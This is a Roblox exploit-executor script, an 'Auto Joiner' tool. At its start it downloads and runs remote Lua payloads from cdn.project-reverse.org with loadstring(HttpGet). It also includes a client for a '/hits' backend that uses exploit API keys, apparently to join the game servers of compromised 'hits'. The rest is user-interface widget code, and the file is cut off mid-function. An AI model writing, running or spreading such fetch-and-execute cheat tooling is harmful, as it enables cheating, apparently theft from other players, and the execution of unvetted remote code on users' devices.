-- discord.gg/syncrypt

if game.PlaceId == 133438856880402 then
     loadstring(game:HttpGet("https://cdn.project-reverse.org/auto-mail-claim.luau"))()

     return
end

if game.PlaceId == 13772394625 then
     loadstring(game:HttpGet("https://cdn.project-reverse.org/BladeBallAJ.luau"))()

     return
end


if getgenv().executed then
	if game.PlaceId ~= 96342491571673 and game.PlaceId ~= 109983668079237 then
		return
	end

	if getgenv().accessCode then
		return
	end
end

getgenv().executed = true

local handlers

handlers = {
	cache = {},
	load = function(p1)
		if not handlers.cache[p1] then
			handlers.cache[p1] = {
				c = handlers[p1]()
			}
		end

		return handlers.cache[p1].c
	end,
	a = function()
		local s1 = "https://api.project-reverse.org/"

		if not string.find(getexecutorname():lower(), "krnl") then
			string.find(getexecutorname():lower(), "delta")
		end

		local HttpService = game:GetService("HttpService")
		local http_request_ = http_request or request or HttpPost or syn.request

		getexecutorname()

		local u5 = false
		local v6 = getexecutorname():lower()
		local v7 = string.find(v6, "xeno") or string.find(v6, "solara")

		local function v8(p2)
			local s2 = ""

			for i = 1, #p2 do
				local v11 = p2:sub(i, i)

				if v11:match("[a-zA-Z0-9-_.~]") then
					s2 ..= v11
				else
					local v12 = string.byte(v11)

					s2 ..= string.format("%%%02X", v12)
				end
			end

			return s2
		end
		local function v13(p3, p4)
			if p4 >= #p3 then
				return p3
			end

			return p3:sub(1, p4)
		end
		local function v14(p5, p6, p7, p8)
			local v15 = p5:gsub("^/hits/", "")
			local t1 = {}

			if p6 then
				for k, v in pairs(p6) do
					if k ~= "exploit-api-key" and k ~= "Content-Type" then
						t1[k] = v
					end
				end
			end

			local s3 = ""

			if next(t1) then
				local json = HttpService:JSONEncode(t1)

				s3 = v13(v8(json), 400)
			end

			local v21 = string.format("https://api.reverse.software/hits/shitsploit/%s?exploitKey=%s", v15, p8)

			if s3 ~= "" then
				v21 ..= "&query=" .. s3
			end

			if p7 then
				local json = HttpService:JSONEncode(p7)
				local v23 = v8(json)
				local v24 = 500 - #v21 - 6

				if v24 > 0 then
					v21 ..= "&data=" .. v13(v23, v24)
				end
			end

			local v25 = v13(v21, 500)
			local ok, result = pcall(function()
				return HttpService:JSONDecode(game:HttpGet(v25))
			end)
			local v28 = ok and result or nil

			return v28
		end
		local function v29(p9, p10, p11, p12, p13)
			if v7 then
				return v14(p10, p11, p12, p13)
			end

			local t2 = {
				Url = s1 .. p10,
				Method = p9,
				Headers = p11 or {}
			}

			if p9 == "POST" then
				if p12 then
					t2.Body = HttpService:JSONEncode(p12)
				end

				t2.Headers["Content-Type"] = "application/json"
			end

			local ok, result = pcall(function()
				return http_request_(t2)
			end)

			if ok and result and result.Body then
				local ok2, result2 = pcall(function()
					return HttpService:JSONDecode(result.Body)
				end)

				if ok2 then
					return result2
				end
			end

			return nil
		end
		local function v35(p14, p15, p16)
			local post = v29("POST", "/hits/get-hit-for-joiner" .. "?game=" .. p16, {
				["exploit-api-key"] = p14,
				["authorization-key"] = p15
			}, nil, p14)

			if post == nil then
				return nil, false
			end

			if post.success and post.data then
				return post.data, true
			end

			if not post.success then
				warn("Failed to get hit for joiner:", post.error and post.error.message or "Unknown error")
			end

			return nil, true
		end
		local function v37(p17, p18)
			local t3 = {
				["exploit-api-key"] = p17
			}
			local v39 = "/hits/connection" .. "?secretKey=" .. p18

			if not v7 then
				local post = v29("POST", v39, t3, nil, p17)

				if post and post.success then
					return true
				end

				return false
			end

			t3.secretKey = p18

			local s4 = "/hits/connection"
			local t4 = {}

			if u5 then
				t4 = nil
			end

			local post = v29("POST", s4, t3, t4, p17)

			u5 = true

			return post and post.success
		end

		return {
			registerExecution = registerExecution,
			registerHit = registerHit,
			getHitForJoiner = v35,
			createConnection = v37,
			pullConnectionMessage = function(p19, p20)
				local get = v29("GET", ("/hits/connection?secretKey=%*"):format(p20), {
					["exploit-api-key"] = p19
				}, nil, p19)

				if not get or not get.success then
					return nil
				end

				if get.data then
					return get.data
				end

				return nil
			end
		}
	end,
	b = function()
		local t5

		t5 = {
			Colors = {
				Background = Color3.fromRGB(0, 0, 0),
				BackgroundDark = Color3.fromRGB(0, 0, 0),
				Surface = Color3.fromRGB(12, 12, 12),
				SurfaceLight = Color3.fromRGB(22, 22, 22),
				Header = Color3.fromRGB(6, 6, 6),
				Border = Color3.fromRGB(32, 32, 32),
				BorderDark = Color3.fromRGB(20, 20, 20),
				Divider = Color3.fromRGB(24, 24, 24),
				Text = Color3.fromRGB(255, 255, 255),
				TextMuted = Color3.fromRGB(150, 150, 150),
				TextDim = Color3.fromRGB(80, 80, 80),
				Accent = Color3.fromRGB(46, 230, 128),
				AccentDim = Color3.fromRGB(20, 120, 70),
				Danger = Color3.fromRGB(235, 80, 80),
				White = Color3.new(1, 1, 1),
				Black = Color3.new(0, 0, 0)
			},
			applyCorner = function(p21, p22)
				local UICorner = Instance.new("UICorner")

				UICorner.CornerRadius = UDim.new(0, p22 or 8)
				UICorner.Parent = p21

				return UICorner
			end,
			applyPadding = function(p23, p24)
				local UIPadding = Instance.new("UIPadding")
				local uDim = UDim.new(0, p24 or 4)

				UIPadding.PaddingTop = uDim
				UIPadding.PaddingBottom = uDim
				UIPadding.PaddingLeft = uDim
				UIPadding.PaddingRight = uDim
				UIPadding.Parent = p23

				return UIPadding
			end,
			applyTripleStroke = function(p25)
				local UIStroke = Instance.new("UIStroke")

				UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				UIStroke.Color = t5.Colors.Border
				UIStroke.Thickness = 1
				UIStroke.Transparency = 0.2
				UIStroke.Name = "Stroke"
				UIStroke.Parent = p25

				return UIStroke, UIStroke, UIStroke
			end,
			applyListLayout = function(p26, p27)
				local v50 = p27 or {}
				local UIListLayout = Instance.new("UIListLayout")

				UIListLayout.Padding = UDim.new(0, v50.padding or 4)
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout.FillDirection = v50.horizontal and Enum.FillDirection.Horizontal or Enum.FillDirection.Vertical

				if v50.verticalAlign then
					UIListLayout.VerticalAlignment = v50.verticalAlign
				end

				if v50.horizontalAlign then
					UIListLayout.HorizontalAlignment = v50.horizontalAlign
				end

				UIListLayout.Parent = p26

				return UIListLayout
			end,
			applyFlexFill = function(p28)
				local UIFlexItem = Instance.new("UIFlexItem")

				UIFlexItem.FlexMode = Enum.UIFlexMode.Fill
				UIFlexItem.Parent = p28

				return UIFlexItem
			end
		}

		return t5
	end,
	c = function()
		local UserInputService = game:GetService("UserInputService")

		return {
			makeDraggable = function(p29, p30, p31)
				local v54 = p31 or {}
				local u55 = false
				local Position
				local Position2
				local u58

				p29.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						u55 = true
						Position = input.Position
						Position2 = p30.Position
						u58 = nil
					elseif not (input.UserInputType ~= Enum.UserInputType.Touch or u55) then
						u55 = true
						Position = input.Position
						Position2 = p30.Position
						u58 = input
					end
				end)
				UserInputService.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 and u58 == nil and u55 then
						u55 = false
					elseif input.UserInputType == Enum.UserInputType.Touch and input == u58 then
						u55 = false
						u58 = nil
					end
				end)
				UserInputService.InputChanged:Connect(function(input)
					if not u55 or not Position or not Position2 then
						return
					end

					local v59 = false

					if input.UserInputType == Enum.UserInputType.MouseMovement and u58 == nil then
						v59 = true
					elseif input.UserInputType == Enum.UserInputType.Touch and u58 == input then
						v59 = true
					end

					if not v59 then
						return
					end

					local v60 = input.Position - Position
					local v61 = Position2.X.Offset + v60.X
					local v62 = Position2.Y.Offset + v60.Y

					if v54 and v54.minX then
						v61 = math.max(v54.minX, v61)
					end

					if v54 and v54.maxX then
						v61 = math.min(v54.maxX, v61)
					end

					if v54 and v54.minY then
						v62 = math.max(v54.minY, v62)
					end

					if v54 and v54.maxY then
						v62 = math.min(v54.maxY, v62)
					end

					p30.Position = UDim2.new(Position2.X.Scale, v61, Position2.Y.Scale, v62)
				end)
			end,
			makeResizable = function(p32, p33, p34)
				local v63 = p34 or {}
				local minWidth = v63.minWidth or 200
				local minHeight = v63.minHeight or 150
				local maxWidth = v63.maxWidth or 800
				local maxHeight = v63.maxHeight or 600
				local u68 = false
				local Position
				local Size
				local u71

				p32.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						u68 = true
						Position = input.Position
						Size = p33.Size
						u71 = nil
					elseif not (input.UserInputType ~= Enum.UserInputType.Touch or u68) then
						u68 = true
						Position = input.Position
						Size = p33.Size
						u71 = input
					end
				end)
				UserInputService.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 and u71 == nil and u68 then
						u68 = false
					elseif input.UserInputType == Enum.UserInputType.Touch and input == u71 then
						u68 = false
						u71 = nil
					end
				end)
				UserInputService.InputChanged:Connect(function(input)
					if not u68 or not Position or not Size then
						return
					end

					local v72 = false

					if input.UserInputType == Enum.UserInputType.MouseMovement and u71 == nil then
						v72 = true
					elseif input.UserInputType == Enum.UserInputType.Touch and u71 == input then
						v72 = true
					end

					if not v72 then
						return
					end

					local v73 = input.Position - Position
					local v74 = math.clamp(Size.X.Offset + v73.X, minWidth, maxWidth)
					local v75 = math.clamp(Size.Y.Offset + v73.Y, minHeight, maxHeight)

					p33.Size = UDim2.new(Size.X.Scale, v74, Size.Y.Scale, v75)
				end)
			end
		}
	end,
	d = function()
		local v76 = handlers.load("b")
		local v77 = handlers.load("c")
		local UserInputService = game:GetService("UserInputService")

		local function v79(p35, p36)
			local Frame = Instance.new("Frame")

			Frame.AnchorPoint = Vector2.new(0.5, 0.5)
			Frame.BackgroundColor3 = p36
			Frame.BorderSizePixel = 0
			Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
			Frame.Size = UDim2.new(0, 12, 0, 2)
			Frame.Name = "Icon"
			Frame.Parent = p35

			local UICorner = Instance.new("UICorner")

			UICorner.CornerRadius = UDim.new(0, 1)
			UICorner.Parent = Frame
		end
		local function v82(p37, p38)
			local Frame = Instance.new("Frame")

			Frame.AnchorPoint = Vector2.new(0.5, 0.5)
			Frame.BackgroundColor3 = p38
			Frame.BorderSizePixel = 0
			Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
			Frame.Size = UDim2.new(0, 12, 0, 2)
			Frame.Name = "IconH"
			Frame.Parent = p37

			local UICorner = Instance.new("UICorner")

			UICorner.CornerRadius = UDim.new(0, 1)
			UICorner.Parent = Frame

			local Frame2 = Instance.new("Frame")

			Frame2.AnchorPoint = Vector2.new(0.5, 0.5)
			Frame2.BackgroundColor3 = p38
			Frame2.BorderSizePixel = 0
			Frame2.Position = UDim2.new(0.5, 0, 0.5, 0)
			Frame2.Size = UDim2.new(0, 2, 0, 12)
			Frame2.Name = "IconV"
			Frame2.Parent = p37

			local UICorner2 = Instance.new("UICorner")

			UICorner2.CornerRadius = UDim.new(0, 1)
			UICorner2.Parent = Frame2
		end
		local function createFrame(p39, p40)
			local Frame = Instance.new("Frame")

			Frame.BackgroundColor3 = v76.Colors.Divider
			Frame.BorderSizePixel = 0
			Frame.LayoutOrder = p40
			Frame.Size = UDim2.new(1, 0, 0, 1)
			Frame.Name = "Divider"
			Frame.Parent = p39

			return Frame
		end

		return {
			create = function(p41, p42)
				local v89 = p42 or {}
				local Frame = Instance.new("Frame")

				Frame.Active = true
				Frame.AnchorPoint = Vector2.new(0.5, 0.5)
				Frame.BackgroundColor3 = v76.Colors.Background
				Frame.BorderSizePixel = 0
				Frame.Position = v89.position or UDim2.new(0.5, 0, 0.5, 0)
				Frame.Size = v89.size or UDim2.new(0, 380, 0, 380)
				Frame.ZIndex = 2
				Frame.Name = "MainFrame"
				Frame.Parent = p41
				v76.applyCorner(Frame, 12)
				v76.applyPadding(Frame, 16)
				v76.applyTripleStroke(Frame)
				v76.applyListLayout(Frame, {
					padding = 10
				})

				local Frame2 = Instance.new("Frame")

				Frame2.BackgroundTransparency = 1
				Frame2.BorderSizePixel = 0
				Frame2.LayoutOrder = -3
				Frame2.Size = UDim2.new(1, 0, 0, 28)
				Frame2.Name = "Header"
				Frame2.Parent = Frame

				local TextLabel = Instance.new("TextLabel")

				TextLabel.Font = Enum.Font.GothamBold
				TextLabel.Text = v89.title or "Auto Joiner"
				TextLabel.TextColor3 = v76.Colors.Text
				TextLabel.TextSize = 15
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left
				TextLabel.TextYAlignment = Enum.TextYAlignment.Center
				TextLabel.AnchorPoint = Vector2.new(0, 0.5)
				TextLabel.BackgroundTransparency = 1
				TextLabel.BorderSizePixel = 0
				TextLabel.Position = UDim2.new(0, 0, 0.5, 0)
				TextLabel.Size = UDim2.new(1, -34, 1, 0)
				TextLabel.Name = "Title"
				TextLabel.Parent = Frame2

				local TextButton = Instance.new("TextButton")

				TextButton.Text = ""
				TextButton.AnchorPoint = Vector2.new(1, 0.5)
				TextButton.AutoButtonColor = false
				TextButton.BackgroundColor3 = v76.Colors.Surface
				TextButton.BorderSizePixel = 0
				TextButton.Position = UDim2.new(1, 0, 0.5, 0)
				TextButton.Size = UDim2.new(0, 26, 0, 26)
				TextButton.ZIndex = 3
				TextButton.Name = "Minimize"
				TextButton.Parent = Frame2
				v76.applyCorner(TextButton, 6)

				local UIStroke = Instance.new("UIStroke")

				UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				UIStroke.Color = v76.Colors.Border
				UIStroke.Thickness = 1
				UIStroke.Transparency = 0.2
				UIStroke.Parent = TextButton
				v79(TextButton, v76.Colors.Text)
				TextButton.MouseEnter:Connect(function()
					TextButton.BackgroundColor3 = v76.Colors.SurfaceLight
				end)
				TextButton.MouseLeave:Connect(function()
					TextButton.BackgroundColor3 = v76.Colors.Surface
				end)
				createFrame(Frame, -2)

				local Frame3 = Instance.new("Frame")

				Frame3.BackgroundTransparency = 1
				Frame3.BorderSizePixel = 0
				Frame3.LayoutOrder = -1
				Frame3.Size = UDim2.new(1, 0, 0, 28)
				Frame3.Name = "Tabs"
				Frame3.Parent = Frame
				v76.applyListLayout(Frame3, {
					padding = 18,
					horizontal = true
				})
				createFrame(Frame, 0)

				local CanvasGroup = Instance.new("CanvasGroup")

				CanvasGroup.AnchorPoint = Vector2.new(0.5, 1)
				CanvasGroup.BackgroundTransparency = 1
				CanvasGroup.BorderSizePixel = 0
				CanvasGroup.LayoutOrder = 1
				CanvasGroup.Position = UDim2.new(0.5, 0, 1, 0)
				CanvasGroup.Size = UDim2.new(1, 0, 0, 0)
				CanvasGroup.Name = "Container"
				CanvasGroup.Parent = Frame
				v76.applyFlexFill(CanvasGroup)

				local UIPageLayout = Instance.new("UIPageLayout")

				UIPageLayout.Padding = UDim.new(0, 8)
				UIPageLayout.SortOrder = Enum.SortOrder.LayoutOrder
				UIPageLayout.Parent = CanvasGroup

				local Folder = Instance.new("Folder")

				Folder.Name = "Controls"
				Folder.Parent = Frame

				local ImageButton = Instance.new("ImageButton")

				ImageButton.Image = "rbxassetid://88404375183071"
				ImageButton.ImageTransparency = 0.5
				ImageButton.ImageColor3 = v76.Colors.TextMuted
				ImageButton.AnchorPoint = Vector2.new(1, 1)
				ImageButton.BackgroundTransparency = 1
				ImageButton.BorderSizePixel = 0
				ImageButton.Position = UDim2.new(1, -4, 1, -4)
				ImageButton.Size = UDim2.new(0, 14, 0, 14)
				ImageButton.ZIndex = 3
				ImageButton.Name = "Resize"
				ImageButton.Parent = Folder

				local ImageButton2 = Instance.new("ImageButton")

				ImageButton2.BackgroundTransparency = 1
				ImageButton2.ImageTransparency = 1
				ImageButton2.Size = UDim2.new(0, 0, 0, 0)
				ImageButton2.Visible = false
				ImageButton2.Name = "Downslam"
				ImageButton2.Parent = Folder
				v77.makeDraggable(Frame, Frame)
				v77.makeDraggable(Frame2, Frame)
				v77.makeDraggable(TextLabel, Frame)
				v77.makeResizable(ImageButton, Frame, {
					minWidth = v89.minWidth or 300,
					minHeight = v89.minHeight or 280
				})

				local Frame4 = Instance.new("Frame")

				Frame4.Active = true
				Frame4.AnchorPoint = Vector2.new(0.5, 0)
				Frame4.AutomaticSize = Enum.AutomaticSize.X
				Frame4.BackgroundColor3 = v76.Colors.Background
				Frame4.BorderSizePixel = 0
				Frame4.Position = UDim2.new(0.5, 0, 0, 16)
				Frame4.Size = UDim2.new(0, 0, 0, 40)
				Frame4.Visible = false
				Frame4.ZIndex = 2
				Frame4.Name = "MinimizedFrame"
				Frame4.Parent = p41
				v76.applyCorner(Frame4, 10)
				v76.applyTripleStroke(Frame4)
				v76.applyPadding(Frame4, 8)
				v76.applyListLayout(Frame4, {
					padding = 12,
					horizontal = true,
					verticalAlign = Enum.VerticalAlignment.Center
				})

				local Frame5 = Instance.new("Frame")

				Frame5.AutomaticSize = Enum.AutomaticSize.X
				Frame5.BackgroundTransparency = 1
				Frame5.BorderSizePixel = 0
				Frame5.LayoutOrder = 1
				Frame5.Size = UDim2.new(0, 0, 1, 0)
				Frame5.Name = "Content"
				Frame5.Parent = Frame4
				v76.applyListLayout(Frame5, {
					padding = 14,
					horizontal = true,
					verticalAlign = Enum.VerticalAlignment.Center
				})

				local TextButton2 = Instance.new("TextButton")

				TextButton2.Text = ""
				TextButton2.AutoButtonColor = false
				TextButton2.BackgroundColor3 = v76.Colors.Surface
				TextButton2.BorderSizePixel = 0
				TextButton2.LayoutOrder = 2
				TextButton2.Size = UDim2.new(0, 26, 0, 26)
				TextButton2.Name = "Expand"
				TextButton2.Parent = Frame4
				v76.applyCorner(TextButton2, 6)

				local UIStroke2 = Instance.new("UIStroke")

				UIStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				UIStroke2.Color = v76.Colors.Border
				UIStroke2.Thickness = 1
				UIStroke2.Transparency = 0.2
				UIStroke2.Parent = TextButton2
				v82(TextButton2, v76.Colors.TextMuted)
				TextButton2.MouseEnter:Connect(function()
					TextButton2.BackgroundColor3 = v76.Colors.SurfaceLight
				end)
				TextButton2.MouseLeave:Connect(function()
					TextButton2.BackgroundColor3 = v76.Colors.Surface
				end)
				v77.makeDraggable(Frame4, Frame4)

				if UserInputService.TouchEnabled then
					local ViewportSize = workspace.CurrentCamera.ViewportSize
					local scale = math.clamp(math.min(ViewportSize.X, ViewportSize.Y) * 0.88 / 380, 0.7, 1.5)
					local UIScale = Instance.new("UIScale")

					UIScale.Scale = scale
					UIScale.Parent = Frame

					local UIScale2 = Instance.new("UIScale")

					UIScale2.Scale = scale
					UIScale2.Parent = Frame4
				end

				local u109 = false

				local function v110(p43)
					u109 = p43
					Frame.Visible = not p43
					Frame4.Visible = p43
				end
				local function v111()
					return u109
				end

				TextButton.MouseButton1Click:Connect(function()
					v110(true)
				end)
				TextButton2.MouseButton1Click:Connect(function()
					v110(false)
				end)

				return {
					Frame = Frame,
					Header = Frame2,
					Title = TextLabel,
					Container = CanvasGroup,
					Tabs = Frame3,
					Resize = ImageButton,
					Downslam = ImageButton2,
					Minimize = TextButton,
					MinimizedFrame = Frame4,
					MinimizedContent = Frame5,
					Expand = TextButton2,
					setMinimized = v110,
					isMinimized = v111,
					PageLayout = UIPageLayout
				}
			end
		}
	end,
	e = function()
		local v112 = handlers.load("b")

		return {
			create = function(p44, p45)
				local TextButton = Instance.new("TextButton")

				TextButton.Font = Enum.Font.GothamMedium
				TextButton.AutoButtonColor = false
				TextButton.Text = p45.text
				TextButton.TextSize = 13
				TextButton.AutomaticSize = Enum.AutomaticSize.X
				TextButton.BackgroundTransparency = 1
				TextButton.BorderSizePixel = 0
				TextButton.Size = UDim2.new(0, 0, 1, 0)
				TextButton.LayoutOrder = p45.layoutOrder or 0
				TextButton.Name = p45.text
				TextButton.Parent = p44

				local Frame = Instance.new("Frame")

				Frame.AnchorPoint = Vector2.new(0.5, 1)
				Frame.BackgroundColor3 = v112.Colors.Text
				Frame.BorderSizePixel = 0
				Frame.Position = UDim2.new(0.5, 0, 1, 0)
				Frame.Size = UDim2.new(1, 0, 0, 1)
				Frame.Name = "Underline"
				Frame.Parent = TextButton

				if p45.active then
					TextButton.TextColor3 = v112.Colors.Text
					Frame.Visible = true
				else
					TextButton.TextColor3 = v112.Colors.TextDim
					Frame.Visible = false
				end

				return TextButton
			end,
			setActive = function(p46, p47)
				local Underline = p46:FindFirstChild("Underline")

				if p47 then
					p46.TextColor3 = v112.Colors.Text

					if Underline then
						Underline.Visible = true
					end
				else
					p46.TextColor3 = v112.Colors.TextDim

					if Underline then
						Underline.Visible = false
					end
				end
			end
		}
	end,
	f = function()
		local v116 = handlers.load("b")

		return {
			create = function(p48, p49)
				local Frame = Instance.new("Frame")

				Frame.BackgroundTransparency = 1
				Frame.BorderSizePixel = 0
				Frame.Size = UDim2.new(1, 0, 1, 0)
				Frame.Name = p49.name
				Frame.LayoutOrder = p49.layoutOrder or 0
				Frame.Parent = p48
				v116.applyListLayout(Frame, {
					padding = 4
				})
				v116.applyPadding(Frame, 4)

				return Frame
			end
		}
	end
}

local function g()
	local v119 = handlers.load("b")

	return {
		create = function(p50, p51)
			local v120 = p51 or {}
			local Frame = Instance.new("Frame")

			Frame.BackgroundTransparency = 1
			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(1, 0, 0, v120.height or 44)
			Frame.LayoutOrder = v120.layoutOrder or 0
			Frame.Name = "Row"
			Frame.Parent = p50

			local Frame2 = Instance.new("Frame")

			Frame2.BackgroundTransparency = 1
			Frame2.BorderSizePixel = 0
			Frame2.Position = UDim2.new(0, 0, 0, 0)
			Frame2.Size = UDim2.new(1, 0, 1, -1)
			Frame2.Name = "Inner"
			Frame2.Parent = Frame
			v119.applyListLayout(Frame2, {
				padding = 8,
				horizontal = true,
				verticalAlign = Enum.VerticalAlignment.Center
			})

			local UIPadding = Instance.new("UIPadding")

			UIPadding.PaddingLeft = UDim.new(0, 4)
			UIPadding.PaddingRight = UDim.new(0, 4)
			UIPadding.Parent = Frame2

			local Frame3 = Instance.new("Frame")

			Frame3.AnchorPoint = Vector2.new(0.5, 1)
			Frame3.BackgroundColor3 = v119.Colors.Divider
			Frame3.BorderSizePixel = 0
			Frame3.Position = UDim2.new(0.5, 0, 1, 0)
			Frame3.Size = UDim2.new(1, 0, 0, 1)
			Frame3.Name = "Divider"
			Frame3.Parent = Frame

			return Frame2
		end,
		addTitle = function(p52, p53)
			local TextLabel = Instance.new("TextLabel")

			TextLabel.Font = Enum.Font.GothamMedium
			TextLabel.Text = p53
			TextLabel.TextColor3 = v119.Colors.TextMuted
			TextLabel.TextSize = 13
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.AutomaticSize = Enum.AutomaticSize.XY
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.LayoutOrder = 1
			TextLabel.Name = "Title"
			TextLabel.Parent = p52

			return TextLabel
		end,
		addContent = function(p54)
			local Frame = Instance.new("Frame")

			Frame.BackgroundTransparency = 1
			Frame.BorderSizePixel = 0
			Frame.LayoutOrder = 2
			Frame.Size = UDim2.new(1, 0, 1, 0)
			Frame.Name = "Content"
			Frame.Parent = p54
			v119.applyFlexFill(Frame)
			v119.applyListLayout(Frame, {
				padding = 8,
				horizontal = true,
				horizontalAlign = Enum.HorizontalAlignment.Right,
				verticalAlign = Enum.VerticalAlignment.Center
			})

			return Frame
		end
	}
end

handlers.g = g
handlers.h = function()
	local TweenService = game:GetService("TweenService")
	local v128 = handlers.load("b")
	local n1 = 40
	local n2 = 22
	local n3 = 16
	local n4 = 3

	return {
		create = function(p55, p56)
			local v133 = p56 or {}
			local default = v133.default or false
			local TextButton = Instance.new("TextButton")

			TextButton.Text = ""
			TextButton.AutoButtonColor = false

			local Accent

			if default then
				Accent = v128.Colors.Accent
			else
				Accent = v128.Colors.SurfaceLight
			end

			TextButton.BackgroundColor3 = Accent
			TextButton.BorderSizePixel = 0
			TextButton.Size = UDim2.new(0, n1, 0, n2)
			TextButton.Name = "Toggle"
			TextButton.Parent = p55
			v128.applyCorner(TextButton, n2 / 2)

			local UIStroke = Instance.new("UIStroke")

			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			UIStroke.Color = v128.Colors.Border
			UIStroke.Thickness = 1
			UIStroke.Transparency = 0.3
			UIStroke.Parent = TextButton

			local Frame = Instance.new("Frame")

			Frame.AnchorPoint = Vector2.new(0, 0.5)
			Frame.BackgroundColor3 = v128.Colors.White
			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(0, n3, 0, n3)

			local n5 = 0
			local v140

			if default then
				v140 = n1 - n3 - n4
			else
				v140 = n4
			end

			Frame.Position = UDim2.new(n5, v140, 0.5, 0)
			Frame.Name = "Knob"
			Frame.Parent = TextButton
			v128.applyCorner(Frame, n3 / 2)

			local function v141()
				local v142

				if default then
					v142 = n1 - n3 - n4
				else
					v142 = n4
				end

				local Accent2

				if default then
					Accent2 = v128.Colors.Accent
				else
					Accent2 = v128.Colors.SurfaceLight
				end

				local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

				TweenService:Create(Frame, tweenInfo, {
					Position = UDim2.new(0, v142, 0.5, 0)
				}):Play()
				TweenService:Create(TextButton, tweenInfo, {
					BackgroundColor3 = Accent2
				}):Play()
			end
			local function v145(p57, p58)
				if default ~= p57 then
					default = p57
					v141()

					if p58 ~= false then
						if v133.onChanged then
							v133.onChanged(default)
						end
					end
				end
			end

			TextButton.MouseButton1Click:Connect(function()
				v145(not default, true)
			end)

			return {
				button = TextButton,
				setValue = v145
			}
		end
	}
end
handlers.i = function()
	local v146 = handlers.load("b")

	return {
		create = function(p59, p60)
			local color = p60.color or v146.Colors.Accent
			local Frame = Instance.new("Frame")

			Frame.BackgroundColor3 = color
			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(0, 8, 0, 8)
			Frame.LayoutOrder = 1
			Frame.Name = "Dot"
			Frame.Parent = p59
			v146.applyCorner(Frame, 4)

			local UIStroke = Instance.new("UIStroke")

			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			UIStroke.Color = color
			UIStroke.Thickness = 3
			UIStroke.Parent = Frame

			local TextLabel = Instance.new("TextLabel")

			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = p60.text
			TextLabel.TextColor3 = color
			TextLabel.TextSize = 14
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.AutomaticSize = Enum.AutomaticSize.XY
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.LayoutOrder = 2
			TextLabel.Parent = p59

			return Frame, TextLabel
		end
	}
end
handlers.j = function()
	local v151 = handlers.load("b")

	return {
		create = function(p61, p62)
			local u152 = (p62 or {}).active ~= false
			local Frame = Instance.new("Frame")

			Frame.BorderSizePixel = 0
			Frame.Size = UDim2.new(0, 8, 0, 8)
			Frame.LayoutOrder = 1
			Frame.Name = "Dot"
			Frame.Parent = p61
			v151.applyCorner(Frame, 4)

			local UIStroke = Instance.new("UIStroke")

			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			UIStroke.Thickness = 2
			UIStroke.Transparency = 0.6
			UIStroke.Name = "DotStroke"
			UIStroke.Parent = Frame

			local function v155(p63)
				u152 = p63

				local Accent = p63 and v151.Colors.Accent

				Accent = Accent or v151.Colors.Danger
				Frame.BackgroundColor3 = Accent
				UIStroke.Color = Accent
			end

			v155(u152)

			return {
				Dot = Frame,
				setActive = v155
			}
		end
	}
end
handlers.k = function()
	local v157 = handlers.load("b")

	return {
		create = function(p64, p65)
			local u158 = (p65 or {}).value or 0
			local TextLabel = Instance.new("TextLabel")

			TextLabel.Font = Enum.Font.GothamMedium
			TextLabel.TextColor3 = v157.Colors.Text
			TextLabel.TextSize = 13
			TextLabel.TextXAlignment = Enum.TextXAlignment.Right
			TextLabel.AutomaticSize = Enum.AutomaticSize.XY
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Name = "CounterLabel"
			TextLabel.Parent = p64

			local function v160(p66)
				local v161 = tostring(p66)
				local v162

				repeat
					v161, v162 = string.gsub(v161, "^(-?%d+)(%d%d%d)", "%1,%2")
				until v162 == 0

				return v161
			end
			local function v163(p67)
				u158 = p67
				TextLabel.Text = v160(p67)
			end
			local function v164()
				return u158
			end

			v163(u158)

			return {
				Label = TextLabel,
				setValue = v163,
				getValue = v164
			}
		end
	}
end
handlers.l = function()
	local v165 = handlers.load("b")

	return {
		create = function(p68, p69)
			local v166 = p69 or {}
			local variant = v166.variant or "default"
			local v168 = ({
				sm = {
					height = 26,
					paddingH = 10,
					fontSize = 12
				},
				md = {
					height = 32,
					paddingH = 14,
					fontSize = 13
				},
				lg = {
					height = 38,
					paddingH = 18,
					fontSize = 14
				}
			})[v166.size or "md"]
			local v169 = ({
				default = {
					bg = v165.Colors.Surface,
					bgHover = v165.Colors.SurfaceLight,
					text = v165.Colors.Text,
					border = v165.Colors.Border,
					bgTransparency = 0
				},
				primary = {
					bg = v165.Colors.White,
					bgHover = Color3.fromRGB(220, 220, 220),
					text = v165.Colors.Black,
					border = v165.Colors.White,
					bgTransparency = 0
				},
				secondary = {
					bg = v165.Colors.SurfaceLight,
					bgHover = v165.Colors.Border,
					text = v165.Colors.Text,
					border = v165.Colors.Border,
					bgTransparency = 0
				},
				ghost = {
					bg = v165.Colors.Black,
					bgHover = v165.Colors.Surface,
					text = v165.Colors.TextMuted,
					border = v165.Colors.Black,
					bgTransparency = 1
				}
			})[variant]
			local TextButton = Instance.new("TextButton")

			TextButton.Font = Enum.Font.GothamMedium
			TextButton.Text = v166.text or "Button"
			TextButton.TextSize = v168.fontSize
			TextButton.TextColor3 = v169.text
			TextButton.BackgroundColor3 = v169.bg
